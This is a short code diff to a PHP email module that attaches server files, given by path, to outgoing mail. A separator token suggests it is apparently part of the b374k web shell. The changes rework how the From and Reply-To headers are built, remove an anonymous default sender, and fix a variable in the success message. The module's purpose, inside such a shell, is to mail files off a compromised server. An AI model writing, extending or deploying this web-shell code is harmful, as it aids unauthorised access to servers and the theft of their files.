@@ -26,7 +26,7 @@ $GLOBALS['module']['mail']['content'] = "
 
 if(!function_exists('send_email')){
 	function send_email($from, $to, $subject, $msg, $attachment){
-		$headers = "MIME-Version: 1.0\r\nFrom: ".$from."\r\nReply-To: ".$from."\r\n";
+		$headers = "MIME-Version: 1.0\r\n".$from;
 
 		$rand = md5(time());
 		$headers .= "Content-Type: multipart/mixed; boundary=\"".$rand."\"\r\n\r\n";
@@ -62,7 +62,9 @@ if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($
 	$mailAttachment = (!empty($mailAttachment))? explode("{[|b374k|]}", $p['mailAttachment']):array();
 
 	if(empty($mailTo)) output("Please specify at least one recipient");
-	if(empty($mailFrom)) $mailFrom = "anonymous@anonymous.com";
+	if(!empty($mailFrom)){
+		$mailFrom = "From: ".$mailFrom."\r\nReply-To: ".$mailFrom."\r\n";
+	}
 
 	foreach($mailAttachment as $file){
 		$file = trim($file);
@@ -70,7 +72,7 @@ if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($
 		if(!is_file($file)) output("No such file : ".$file);
 	}
 
-	if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output("Mail sent to ".html_safe($to));
+	if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output("Mail sent to ".html_safe($mailTo));
 	output("Failed to send mail");
 }
 
